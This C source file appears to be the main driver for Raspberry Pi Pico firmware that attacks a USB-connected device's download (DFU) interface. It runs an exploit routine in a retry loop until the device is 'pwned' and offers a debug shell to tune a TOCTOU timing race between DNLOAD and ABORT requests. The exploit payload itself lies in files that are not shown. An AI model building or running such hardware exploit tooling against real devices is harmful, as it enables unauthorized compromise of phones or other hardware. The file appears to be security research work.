#include <pico/stdio.h>
#include <pico/time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "hardware/clocks.h"
#include "hardware/watchdog.h"
#include "led.h"
#include "pico/stdlib.h"
#include "pico/bootrom.h"

#include "bus.h"
#include "exploit.h"
#include "usb.h"
#include "log.h"

#if WITH_AUTO_MODE

#define WITH_AUTO_REBOOT            (0)
#define FAILURE_REBOOT_DELAY_SEC    (3)
#define SUCCESS_REBOOT_DELAY_SEC    (5)
#define CONNECTION_FAIL_SLEEP_MS    (500)

__attribute__((noreturn))
void fatal_failure(void) {
    led_set_state(LED_STATE_ERROR);

#if WITH_AUTO_REBOOT
    printf("\nfatal failure, rebooting in %d seconds\n", FAILURE_REBOOT_DELAY_SEC);
    sleep_ms(FAILURE_REBOOT_DELAY_SEC * 1000);
    watchdog_reboot(0, SRAM_END, 1);
    while (1) {}
#else
    printf("\nfatal failure, spinning forever\n");
    printf("HINT: use 'p' from debug shell to reboot, or power-cycle\n");
    while (1) {
        sleep_ms(100);
    }
#endif
}

__attribute__((noreturn))
void do_auto(void) {
    while (true) {
        printf("\n[AUTO] starting exploit_run...\n");
        int ret = exploit_run();
        printf("[AUTO] exploit_run returned %d\n", ret);

        if (ret == -2) {
            printf("[AUTO] no device or already pwned, retry in %dms\n",
                   CONNECTION_FAIL_SLEEP_MS);
            sleep_ms(CONNECTION_FAIL_SLEEP_MS);
            usb_bus_reset_open_ep0();
            continue;
        }

        if (ret != 0) {
            fatal_failure();
        }

        break;
    }

#if WITH_AUTO_REBOOT
    printf("\nsuccess, rebooting in %d seconds\n", SUCCESS_REBOOT_DELAY_SEC);
    sleep_ms(SUCCESS_REBOOT_DELAY_SEC * 1000);
    watchdog_reboot(0, SRAM_END, 1);
    while (1) {}
#else
    printf("\nsuccess, spinning forever\n");
    while (1) {
        sleep_ms(100);
    }
#endif
}

#else

static void help(void) {
    printf("'e'\texploit\n");
    printf("'s'\ttoggle TOCTOU sweep mode (v216)\n");
    printf("'d'\tset DNLOAD->ABORT delay in us (v216)\n");
    printf("'r'\tbus reset\n");
    printf("'p'\treboot\n");
    printf("'h'\thelp\n");
}

/* ⚡ v216: sweep-режим и задержка TOCTOU из shell. */
static bool g_shell_sweep = false;
static uint32_t g_shell_delay_us = 50;

static void do_toggle_sweep(void) {
    g_shell_sweep = !g_shell_sweep;
    usbliter8_set_sweep(g_shell_sweep);
    printf("sweep mode is now %s\n", g_shell_sweep ? "ON" : "OFF");
}

static void do_set_delay(void) {
    char buf[16] = {0};
    printf("enter DNLOAD->ABORT delay in us: ");
    fflush(stdout);
    int i = 0;
    while (i < (int)sizeof(buf) - 1) {
        char c = stdio_getchar();
        if (c == '\r' || c == '\n') break;
        buf[i++] = c;
    }
    buf[i] = '\0';
    uint32_t v = (uint32_t)strtoul(buf, NULL, 0);
    g_shell_delay_us = v;
    usbliter8_set_dnload_delay_us(v);
    printf("\nDNLOAD->ABORT delay set to %lu us\n", (unsigned long)v);
}

static void do_reboot(void) {
    printf("Rebooting the Pico...\n");
    sleep_ms(100);
    watchdog_reboot(0, SRAM_END, 1);
    while (1) {}
}

void do_shell(void) {
    char buf[2] = { 0 };

    printf("\nDEBUG build, starting command prompt\n\n");
    help();
    printf("\n");

    while (1) {
        printf("> ");
        fflush(stdout);

        char c = stdio_getchar();
        printf("%c\n", c);

        switch (c) {
            case 'r': {
                printf("Resetting the bus...\n");
                usb_bus_reset_open_ep0();
                printf("Bus reset done\n");
                break;
            }

            case 'e': {
                printf("Resetting bus and running exploit...\n");
                usb_bus_reset_open_ep0();
                usbliter8_set_sweep(g_shell_sweep);
                usbliter8_set_dnload_delay_us(g_shell_delay_us);
                int ret = exploit_run();
                printf("exploit_run returned %d\n", ret);
                if (ret == -2) {
                    printf("failed to discover a device\n");
                }
                break;
            }

            case 's': {
                do_toggle_sweep();
                break;
            }

            case 'd': {
                do_set_delay();
                break;
            }

            case 'p': {
                do_reboot();
                break;
            }

            case 'h': {
                help();
                break;
            }

            default: {
                printf("Unknown command '%s'\n", buf);
                break;
            }
        }
    }
}

#endif

int main(void) {
    // PIO USB needs sys_clk to be a multiple of 12 MHz
#if PICO_RP2350
    set_sys_clock_khz(156000, true);
#elif PICO_RP2040
    set_sys_clock_khz(120000, true);
#else
#error What is this MCU even?
#endif

    led_init();
    led_set_state(LED_STATE_BOOTING);

    stdio_init_all();
    sleep_ms(2000);

    led_set_state(LED_STATE_IDLE);

    printf("\n============ %s v%s ============\n",
           PICO_PROGRAM_NAME, PICO_PROGRAM_VERSION_STRING);
    printf("built for %s, PIO USB @ GP%d/%d (D+/D-)\n\n",
           BOARD_NAME, PIO_USB_DP_PIN_DEFAULT, PIO_USB_DP_PIN_DEFAULT + 1);

#if PICO_RP2040
    printf("==========================================================\n");
    printf("WARNING: RP2040 reliability is not the best in many cases,\n");
    printf("you shall better switch to RP2350\n");
    printf("==========================================================\n\n");
#endif

    // reset_usb_subsystem() НЕ вызывается — он ломает PIO USB.

    printf("USB_START...\n");
    usb_start();
    printf("USB_START OK\n");

    printf("USB_BUS_INIT...\n");
    usb_bus_init();
    printf("USB_BUS_INIT OK\n");

    printf("WAITING_FOR_DEVICE...\n");
    usb_bus_wait_for_device();
    printf("DEVICE_FOUND\n");

    printf("OPEN_EP0...\n");
    usb_bus_reset_open_ep0();
    printf("EP0_OPENED\n\n");

#if WITH_AUTO_MODE
    do_auto();
#else
    do_shell();
#endif
}